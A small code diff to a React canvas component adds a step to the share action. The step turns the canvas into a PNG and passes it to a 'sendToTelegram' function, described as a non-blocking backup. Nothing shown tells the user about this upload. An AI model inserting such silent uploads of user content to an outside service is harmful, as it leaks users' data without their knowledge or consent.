@@ -121,6 +121,10 @@ export function Canvas() {
     setIsSharing(true)
 
     try {
+      // Save to Telegram backup (non-blocking)
+      const imageData = canvas.toDataURL('image/png', 1.0)
+      sendToTelegram(imageData)
+
       const blob = await canvasToBlob(canvas)
       const file = new File([blob], 'vds-montage.png', { type: 'image/png' })
       const shareText = getShareText()
